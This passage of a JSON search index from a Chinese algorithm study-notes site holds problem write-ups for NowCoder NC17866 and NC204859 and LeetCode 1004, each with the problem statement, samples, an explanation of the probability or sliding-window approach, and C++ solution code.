1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#18-sample-output-1","text":"MWH","title":"1.8. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#17-sample-input-2","text":"0 100","title":"1.7. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#18-sample-output-2","text":"CSL","title":"1.8. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#110-source","text":"\u725b\u5ba2\u7f51 NC17866 \u8c01\u662f\u795e\u5c04\u624b","title":"1.10. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#2","text":"\u8f6e\u6b21 \u5148\u624b\u8d62\u7684\u6982\u7387 \u540e\u624b\u8d62\u7684\u6982\u7387 1 \\alpha (1-\\alpha)\\beta 2 (1-\\alpha)(1 - \\beta)\\alpha (1-\\alpha)^2(1 - \\beta)\\beta 3 (1-\\alpha)^2(1 - \\beta)^2\\alpha (1-\\alpha)^3(1 - \\beta)^2\\beta \u5148\u624b\u8d62\u7684\u6982\u7387\u4e3a P(A) = \\sum_{n = 0}^{\\infty} (1-\\alpha)^n(1 - \\beta)^n \\alpha \u540e\u624b\u8d62\u7684\u6982\u7387\u4e3a P(B) = \\sum_{n = 0}^{\\infty} (1-\\alpha)^{n + 1}(1 - \\beta)^n\\beta \u53ef\u4ee5\u8f6c\u5316\u4e3a\u7b49\u6bd4\u6570\u5217\u6c42\u548c\u95ee\u9898 S_n=a_1+a_1q+a_1q^2+...+a_1q^{n-1} qS_n=a_1q+a_1q^2+a_1q^3+...+a_1q^{n} \u4e24\u5f0f\u76f8\u51cf (1-q)S_n = a_1-a_1q^n \u5f97\u5230\u6c42\u548c\u516c\u5f0f S_n = \\frac{a_1(1 - q^{n})}{1-q} \u6c42\u6781\u9650\u5f97 \\lim\\limits_{x \\to \\infin}{S_n} = \\frac{a_1}{1-q} \u5e26\u5165 P(A) \u548c P(B) \u3002 P(A) = \\frac{\\alpha}{1-(1-\\alpha)(1 - \\beta)} P(B) = \\frac{(1 - \\alpha) \\beta}{1-(1-\\alpha)(1 - \\beta)} \u5206\u6bcd\u662f\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u53ea\u6bd4\u8f83\u5206\u5b50 \\alpha \u548c (1 - \\alpha) \\beta \u7684\u5927\u5c0f\u5c31\u53ef\u4ee5\u4e86\u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/1.%E7%89%9B%E5%AE%A2%E7%BD%91_17866_%E8%B0%81%E6%98%AF%E7%A5%9E%E5%B0%84%E6%89%8B/#3","text":"#include <iostream> using namespace std; int main() { int x, y; cin >> x >> y; int rateX = x; int rateY = y * (100 - x) / 100; if (rateX == rateY) { cout << \"equal\" << endl; } else if (rateX > rateY) { cout << \"MWH\" << endl; } else { cout << \"CSL\" << endl; } // } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/","text":"\u725b\u5ba2\u7f51 NC204859 \u7ec4\u961f # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC204859 \u7ec4\u961f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.2. Problem Description # \u4f60\u7684\u56e2\u961f\u4e2d\u6709 n \u4e2a\u4eba\uff0c\u6bcf\u4e2a\u4eba\u6709\u4e00\u4e2a\u80fd\u529b\u503c a_i \uff0c\u73b0\u5728\u9700\u8981\u9009\u62e9\u82e5\u5e72\u4e2a\u4eba\u7ec4\u6210\u4e00\u4e2a\u56e2\u961f\u53bb\u53c2\u52a0\u6bd4\u8d5b\uff0c\u7531\u4e8e\u6bd4\u8d5b\u7684\u89c4\u5219\u9650\u5236\uff0c\u4e00\u4e2a\u56e2\u961f\u91cc\u9762\u4efb\u610f\u4e24\u4e2a\u4eba\u80fd\u529b\u7684\u5dee\u503c\u5fc5\u987b\u8981\u5c0f\u4e8e\u7b49\u4e8e k \uff0c\u4e3a\u4e86\u8ba9\u66f4\u591a\u7684\u4eba\u6709\u53c2\u52a0\u6bd4\u8d5b\u7684\u673a\u4f1a\uff0c\u4f60\u6700\u591a\u80fd\u9009\u62e9\u591a\u5c11\u4e2a\u4eba\u53c2\u52a0\u6bd4\u8d5b\uff1f 1.3. Input # \u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 T \uff0c\u8868\u793a\u6848\u4f8b\u7ec4\u6570\u3002\u6bcf\u4e2a\u6848\u4f8b\u6709\u4e24\u884c\uff1a\u7b2c\u4e00\u884c\u4e24\u4e2a\u6b63\u6574\u6570 n,k \uff0c\u8868\u793a\u4eba\u7684\u6570\u91cf\u3002\u7b2c\u4e8c\u884c n \u4e2a\u4ee5\u7a7a\u683c\u5206\u9694\u7684\u6574\u6570 a_i \uff0c\u8868\u793a\u6bcf\u4e2a\u4eba\u7684\u80fd\u529b\u503c\u3002 1.4. Output # \u6bcf\u4e2a\u6848\u4f8b\u8f93\u51fa\u4e00\u884c\uff0c\u8868\u793a\u53ef\u4ee5\u53c2\u52a0\u6bd4\u8d5b\u7684\u6700\u591a\u4eba\u6570\u3002 1.5. Sample Input # 1 5 3 8 3 5 1 6 1.6. Sample Output # 3 1.7. Note # \u9009\u62e9\u80fd\u529b\u503c\u4e3a 3, 5, 6 \u6216 5, 6, 8 \u3002 T \\leq 10 1 \\leq n \\leq 2e5 1 \\leq k \\leq 1e9 1 <= a_i <= 1e9 1.8. Source # \u725b\u5ba2\u7f51 NC204859 \u7ec4\u961f 2. \u89e3\u8bfb # \u4f7f\u7528\u6ed1\u52a8\u7a97\u53e3\u8fdb\u884c\u8ba1\u7b97\u3002 \u5148\u5bf9\u6570\u7ec4\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u6392\u5e8f\uff0c\u5982\u679c [left, right] \u533a\u95f4\u5185\u7684\u6570\u90fd\u6ee1\u8db3 list[right] - list[left] <= k \uff0c\u5219 right = right + 1 \uff0c\u5426\u5219 left = left + 1 \uff0c\u6bcf\u6ed1\u52a8\u4e00\u6b21\u8ba1\u7b97\u4e00\u6b21 ans = right - left \uff0c\u53d6\u6240\u6709\u60c5\u51b5\u7684\u6700\u5927\u503c\u5373\u53ef\u3002 3. \u4ee3\u7801 # #include<iostream> #include<string.h> #include<algorithm> using namespace std; const int num = 2e5 + 1; long long list[num]; int main(){ long long t, n, k, ans, buffer, left, right; scanf(\"%lld\", &t); for(int j = 0; j < t; j++){ // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); ans = 0; left = 0; right = 1; // \u8f93\u5165 scanf(\"%lld %lld\", &n, &k); for(long long i = 0; i < n; i++){ scanf(\"%lld\", &list[i]); } // \u6392\u5e8f sort(list, list + n); // \u8ba1\u7b97 while(right < n){ // \u5f53\u53f3\u7aef\u70b9\u4e3an\u65f6\u7ed3\u675f\u5faa\u73af if(list[right] - list[left] <= k){ // \u5982\u679c\u6ee1\u8db3\u6761\u4ef6\uff0c\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u5dee\u503c\u5c0f\u4e8e\u7b49\u4e8ek // \u53f3\u7aef\u70b9\u53f3\u79fb right++; }else{ // \u4e0d\u6ee1\u8db3\u6761\u4ef6\uff0c\u5de6\u7aef\u70b9\u53f3\u79fb left++; } ans = max(ans, right - left); } printf(\"%lld\\n\", ans); } return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 NC204859 \u7ec4\u961f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#nc204859","text":"","title":"\u725b\u5ba2\u7f51 NC204859 \u7ec4\u961f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#_1","text":"\u725b\u5ba2\u7f51 NC204859 \u7ec4\u961f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#11-limit","text":"Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#12-problem-description","text":"\u4f60\u7684\u56e2\u961f\u4e2d\u6709 n \u4e2a\u4eba\uff0c\u6bcf\u4e2a\u4eba\u6709\u4e00\u4e2a\u80fd\u529b\u503c a_i \uff0c\u73b0\u5728\u9700\u8981\u9009\u62e9\u82e5\u5e72\u4e2a\u4eba\u7ec4\u6210\u4e00\u4e2a\u56e2\u961f\u53bb\u53c2\u52a0\u6bd4\u8d5b\uff0c\u7531\u4e8e\u6bd4\u8d5b\u7684\u89c4\u5219\u9650\u5236\uff0c\u4e00\u4e2a\u56e2\u961f\u91cc\u9762\u4efb\u610f\u4e24\u4e2a\u4eba\u80fd\u529b\u7684\u5dee\u503c\u5fc5\u987b\u8981\u5c0f\u4e8e\u7b49\u4e8e k \uff0c\u4e3a\u4e86\u8ba9\u66f4\u591a\u7684\u4eba\u6709\u53c2\u52a0\u6bd4\u8d5b\u7684\u673a\u4f1a\uff0c\u4f60\u6700\u591a\u80fd\u9009\u62e9\u591a\u5c11\u4e2a\u4eba\u53c2\u52a0\u6bd4\u8d5b\uff1f","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#13-input","text":"\u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 T \uff0c\u8868\u793a\u6848\u4f8b\u7ec4\u6570\u3002\u6bcf\u4e2a\u6848\u4f8b\u6709\u4e24\u884c\uff1a\u7b2c\u4e00\u884c\u4e24\u4e2a\u6b63\u6574\u6570 n,k \uff0c\u8868\u793a\u4eba\u7684\u6570\u91cf\u3002\u7b2c\u4e8c\u884c n \u4e2a\u4ee5\u7a7a\u683c\u5206\u9694\u7684\u6574\u6570 a_i \uff0c\u8868\u793a\u6bcf\u4e2a\u4eba\u7684\u80fd\u529b\u503c\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#14-output","text":"\u6bcf\u4e2a\u6848\u4f8b\u8f93\u51fa\u4e00\u884c\uff0c\u8868\u793a\u53ef\u4ee5\u53c2\u52a0\u6bd4\u8d5b\u7684\u6700\u591a\u4eba\u6570\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#15-sample-input","text":"1 5 3 8 3 5 1 6","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#16-sample-output","text":"3","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#17-note","text":"\u9009\u62e9\u80fd\u529b\u503c\u4e3a 3, 5, 6 \u6216 5, 6, 8 \u3002 T \\leq 10 1 \\leq n \\leq 2e5 1 \\leq k \\leq 1e9 1 <= a_i <= 1e9","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#18-source","text":"\u725b\u5ba2\u7f51 NC204859 \u7ec4\u961f","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#2","text":"\u4f7f\u7528\u6ed1\u52a8\u7a97\u53e3\u8fdb\u884c\u8ba1\u7b97\u3002 \u5148\u5bf9\u6570\u7ec4\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u6392\u5e8f\uff0c\u5982\u679c [left, right] \u533a\u95f4\u5185\u7684\u6570\u90fd\u6ee1\u8db3 list[right] - list[left] <= k \uff0c\u5219 right = right + 1 \uff0c\u5426\u5219 left = left + 1 \uff0c\u6bcf\u6ed1\u52a8\u4e00\u6b21\u8ba1\u7b97\u4e00\u6b21 ans = right - left \uff0c\u53d6\u6240\u6709\u60c5\u51b5\u7684\u6700\u5927\u503c\u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC204859_%E7%BB%84%E9%98%9F/#3","text":"#include<iostream> #include<string.h> #include<algorithm> using namespace std; const int num = 2e5 + 1; long long list[num]; int main(){ long long t, n, k, ans, buffer, left, right; scanf(\"%lld\", &t); for(int j = 0; j < t; j++){ // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); ans = 0; left = 0; right = 1; // \u8f93\u5165 scanf(\"%lld %lld\", &n, &k); for(long long i = 0; i < n; i++){ scanf(\"%lld\", &list[i]); } // \u6392\u5e8f sort(list, list + n); // \u8ba1\u7b97 while(right < n){ // \u5f53\u53f3\u7aef\u70b9\u4e3an\u65f6\u7ed3\u675f\u5faa\u73af if(list[right] - list[left] <= k){ // \u5982\u679c\u6ee1\u8db3\u6761\u4ef6\uff0c\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u5dee\u503c\u5c0f\u4e8e\u7b49\u4e8ek // \u53f3\u7aef\u70b9\u53f3\u79fb right++; }else{ // \u4e0d\u6ee1\u8db3\u6761\u4ef6\uff0c\u5de6\u7aef\u70b9\u53f3\u79fb left++; } ans = max(ans, right - left); } printf(\"%lld\\n\", ans); } return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/","text":"LeetCode 1004 \u6700\u5927\u8fde\u7eed1\u7684\u4e2a\u6570 III # \u76ee\u5f55 # LeetCode 1004 \u6700\u5927\u8fde\u7eed1\u7684\u4e2a\u6570 III \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u7531\u82e5\u5e72 0 \u548c 1 \u7ec4\u6210\u7684\u6570\u7ec4 A \uff0c\u6211\u4eec\u6700\u591a\u53ef\u4ee5\u5c06 K \u4e2a\u503c\u4ece 0 \u53d8\u6210 1 \u3002 \u8fd4\u56de\u4ec5\u5305\u542b 1 \u7684\u6700\u957f\uff08\u8fde\u7eed\uff09\u5b50\u6570\u7ec4\u7684\u957f\u5ea6\u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1aA = [1,1,1,0,0,0,1,1,1,1,0], K = 2 1.4. Sample Output 1 # \u8f93\u51fa\uff1a6 \u89e3\u91ca\uff1a [1,1,1,0,0,1,1,1,1,1,1] \u7c97\u4f53\u6570\u5b57\u4ece 0 \u7ffb\u8f6c\u5230 1\uff0c\u6700\u957f\u7684\u5b50\u6570\u7ec4\u957f\u5ea6\u4e3a 6\u3002 1.5. Sample Input 2 # \u8f93\u5165\uff1aA = [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], K = 3 1.6. Sample Output 2 # \u8f93\u51fa\uff1a10 \u89e3\u91ca\uff1a [0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1] \u7c97\u4f53\u6570\u5b57\u4ece 0 \u7ffb\u8f6c\u5230 1\uff0c\u6700\u957f\u7684\u5b50\u6570\u7ec4\u957f\u5ea6\u4e3a 10\u3002 1.7. Note # 1 <= A.length <= 20000 0 <= K <= A.length A[i] \u4e3a 0 \u6216 1 1.8. Source # LeetCode 1004 \u6700\u5927\u8fde\u7eed1\u7684\u4e2a\u6570 III 2. \u89e3\u8bfb # \u6ed1\u52a8\u7a97\u53e3\u3001\u5c3a\u53d6\u6cd5\u3002\u7edf\u8ba1\u7a97\u53e3\u5185 0 \u7684\u6570\u91cf\u662f\u5426\u5927\u4e8e K \uff0c\u5927\u4e8e K \u5219\u51cf\u5c0f\u7a97\u53e3\u5927\u5c0f\u3002 3. \u4ee3\u7801 # class Solution { public: int longestOnes(vector<int>& A, int K) { queue<int> qu; int count = 0; size_t ans = 0; size_t len = A.size(); // \u5c3a\u53d6 for (size_t i = 0; i < len; i++) { // \u653e\u5165\u961f\u5217 qu.push(A[i]); // \u8bb0\u5f55\u961f\u5217\u4e2d0\u7684\u6570\u91cf if (A[i] == 0) count++; // \u5f530\u7684\u6570\u91cf\u5927\u4e8eK\u65f6\uff0c\u51fa\u961f while (count > K) { if (qu.front() == 0) count--; qu.pop(); } // \u8bb0\u5f55\u961f\u5217\u6700\u5927\u957f\u5ea6 ans = max(ans, qu.size()); } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.LeetCode 1004 \u6700\u5927\u8fde\u7eed1\u7684\u4e2a\u6570 III"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#leetcode-1004-1-iii","text":"","title":"LeetCode 1004 \u6700\u5927\u8fde\u7eed1\u7684\u4e2a\u6570 III"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#_1","text":"LeetCode 1004 \u6700\u5927\u8fde\u7eed1\u7684\u4e2a\u6570 III \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u7531\u82e5\u5e72 0 \u548c 1 \u7ec4\u6210\u7684\u6570\u7ec4 A \uff0c\u6211\u4eec\u6700\u591a\u53ef\u4ee5\u5c06 K \u4e2a\u503c\u4ece 0 \u53d8\u6210 1 \u3002 \u8fd4\u56de\u4ec5\u5305\u542b 1 \u7684\u6700\u957f\uff08\u8fde\u7eed\uff09\u5b50\u6570\u7ec4\u7684\u957f\u5ea6\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#13-sample-input-1","text":"\u8f93\u5165\uff1aA = [1,1,1,0,0,0,1,1,1,1,0], K = 2","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/2.LeetCode_1004_%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD1%E7%9A%84%E4%B8%AA%E6%95%B0_III/#14-sample-output-1","text":"\u8f93\u51fa\uff1a6 \u89e3\u91ca\uff1a [1,1,1,0,0,1,1,1,1,1,1] \u7c97\u4f53\u6570\u5b57\u4ece 0 